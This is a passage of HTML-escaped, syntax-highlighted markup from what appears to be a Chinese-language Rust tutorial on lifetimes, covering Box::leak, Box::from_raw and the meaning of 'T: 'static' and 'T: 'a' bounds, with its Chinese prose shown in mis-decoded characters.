&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">str_literal&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nb">&amp;#39;static&lt;/span> &lt;span class="kt">str&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;å­—ç¬¦ä¸²å­—é¢é‡&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>é€šè¿‡ &lt;code>Box::leak&lt;/code> æ–¹æ³•åœ¨è¿è¡Œæ—¶ç”Ÿæˆä¸€ä¸ª &lt;code>&amp;amp;'static T&lt;/code>, ä¸‹é¢å°†å±•å¼€è®ºè¿°ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="é€šè¿‡-box-leak-ç”Ÿæˆ-and-static-t-å¼•ç”¨">é€šè¿‡ &lt;code>Box::leak&lt;/code> ç”Ÿæˆ &lt;code>&amp;amp;'static T&lt;/code> å¼•ç”¨&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">s&lt;/span>: &lt;span class="nb">String&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Drop&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">drop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s"> has been dropped!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">leak_a&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nb">&amp;#39;static&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">s&lt;/span>: &lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">to_string&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Box&lt;/span>::&lt;span class="n">leak&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">into&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nb">&amp;#39;static&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">leak_a&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;a = &lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// recover `a` Box from the leaked reference
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">unsafe&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">const_ptr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="k">const&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mut_ptr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">const_ptr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Box&lt;/span>::&lt;span class="n">from_raw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mut_ptr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;a = &lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// `a` will be dropped here
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">a = A { s: &amp;#34;hello&amp;#34; }
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a = A { s: &amp;#34;hello&amp;#34; }
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A { s: &amp;#34;hello&amp;#34; } has been dropped!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šé¢è¿™ä¸ªä¾‹å­æœ‰ä¸¤ä¸ªè¦ç‚¹ï¼š&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡ &lt;code>Box::leak&lt;/code> ç”Ÿæˆ &lt;code>&amp;amp;'static T&lt;/code> å¼•ç”¨&lt;/li>
&lt;li>é€šè¿‡ &lt;code>Box::from_raw&lt;/code> å°†å¼•ç”¨æ¢å¤ä¸ºä¸€ä¸ª &lt;code>Box&lt;/code> å¯¹è±¡ï¼ˆéœ€ç»“åˆ unsafe ä»£ç ï¼‰&lt;/li>
&lt;/ul>
&lt;p>å…³äºè¿™ä¸ªä¸»é¢˜çš„è¿›ä¸€æ­¥çš„è®¨è®ºï¼Œå¯ä»¥å‚è€ƒ&lt;a href="https://github.com/pretzelhammer/rust-blog/pull/73">æˆ‘ç»™ rust-blog æçš„ä¸€ä¸ª PR&lt;/a>ã€‚&lt;/p>
&lt;h2 id="åœ¨æ³›å‹ä¸­ä½¿ç”¨-lifetime">åœ¨æ³›å‹ä¸­ä½¿ç”¨ Lifetime&lt;/h2>
&lt;h3 id="ç†è§£-t-static">ç†è§£ &lt;code>T: 'static&lt;/code>&lt;/h3>
&lt;p>è¯·æ³¨æ„å’Œ &lt;a href="https://mincodes.com/posts/understanding-lifetimes-in-rust/#%E7%90%86%E8%A7%A3-and-static-t-%E5%BC%95%E7%94%A8">&amp;amp;&amp;lsquo;static T å¼•ç”¨&lt;/a> ä¹‹é—´çš„åŒºåˆ«ã€‚&lt;/p>
&lt;p>ä¸‹é¢çš„è¯»æ³•æœ‰åŠ©äºæ­£ç¡®ç†è§£ &lt;code>T: 'static&lt;/code>:&lt;/p>
&lt;blockquote>
&lt;p>ğŸŒŸ &lt;code>T: 'static&lt;/code> åº”è¯»ä½œï¼š &lt;code>T&lt;/code> å—åˆ° &lt;code>'static&lt;/code> ç±»å‹ç”Ÿå‘½å‘¨æœŸçš„çº¦æŸã€‚&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>T: 'static&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>åŒ…æ‹¬æ‰€æœ‰çš„ &lt;code>&amp;amp;'static T&lt;/code>&lt;/li>
&lt;li>ä¹ŸåŒ…æ‹¬æ‰€æœ‰çš„ owned types, å› ä¸º owner å¯ä»¥ç¡®ä¿æ•°æ®ä¸€ç›´æœ‰æ•ˆã€‚å› æ­¤ &lt;code>T: 'static&lt;/code> ï¼š
&lt;ul>
&lt;li>å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ†é…&lt;/li>
&lt;li>ä¸éœ€è¦åœ¨æ•´ä¸ªç¨‹åºç”Ÿå‘½å‘¨æœŸå†…æœ‰æ•ˆ&lt;/li>
&lt;li>å¯ä»¥å®‰å…¨ã€è‡ªç”±åœ°ä¿®æ”¹&lt;/li>
&lt;li>å¯ä»¥åœ¨è¿è¡Œæ—¶è¢«é‡Šæ”¾&lt;/li>
&lt;li>å¯ä»¥æœ‰ä¸åŒæŒç»­æ—¶é—´çš„ç”Ÿå‘½å‘¨æœŸ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;!--listend-->
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">drop_static&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nb">&amp;#39;static&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">mem&lt;/span>::&lt;span class="nb">drop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">strings&lt;/span>: &lt;span class="nb">Vec&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Vec&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">strings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">to_string&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// strings are owned types so they&amp;#39;re bounded by &amp;#39;static
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">strings&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// all the strings are mutable
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;a mutation&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// all the strings are droppable
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">drop_static&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// âœ…
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç†è§£-and-a-t-å’Œ-t-a">ç†è§£ &lt;code>&amp;amp;'a T&lt;/code> å’Œ &lt;code>T: 'a&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>&amp;amp;'a T&lt;/code> éšå«äº† &lt;code>T: 'a&lt;/code>&lt;/p>
&lt;p>å¦‚æœä¸€ä¸ª &lt;code>T&lt;/code> çš„å¼•ç”¨åœ¨ &lt;code>'a&lt;/code> å†…æœ‰æ•ˆï¼Œé‚£ä¹ˆ &lt;code>T&lt;/code> åœ¨è¿™ä¸ªå‘¨æœŸå†…ä¹Ÿå¿…é¡»æœ‰æ•ˆï¼Œå¦åˆ™å‰è€…ä¸æˆç«‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>T:'a&lt;/code> æ¯” &lt;code>&amp;amp;'a T&lt;/code> æ›´åŠ é€šç”¨å’Œçµæ´»&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å‰è€…å¯ä»¥æ¥å— owned types (æŒ‡éå¼•ç”¨ç±»å‹) å’Œå¼•ç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åè€…åªèƒ½æ¥å—å¼•ç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœ &lt;code>T: 'static&lt;/code>, é‚£ä¹ˆ &lt;code>T: 'a&lt;/code>, å› ä¸ºï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å‰è€…è¯»ä½œï¼šT æ»¡è¶³é™æ€ç”Ÿå‘½å‘¨æœŸçº¦æŸ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åè€…è¯»ä½œï¼šT æ»¡è¶³ &lt;code>'a&lt;/code> ç”Ÿå‘½å‘¨æœŸçº¦æŸ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>é™æ€ç”Ÿå‘½å‘¨æœŸ &amp;gt;= &lt;code>'a&lt;/code> ç”Ÿå‘½å‘¨æœŸï¼Œå› æ­¤ä¸Šè¿°ç»“è®ºæˆç«‹&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>æ¡ˆä¾‹ï¼ˆå‚è€ƒè‡ª&lt;a href="https://github.com/pretzelhammer/rust-blog/blob/master/posts/common-rust-lifetime-misconceptions.md">common-rust-lifetime-misconceptions&lt;/a>)ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// only takes ref types bounded by &amp;#39;a
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">t_ref&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// takes any types bounded by &amp;#39;a
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">t_bound&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// owned type which contains a reference
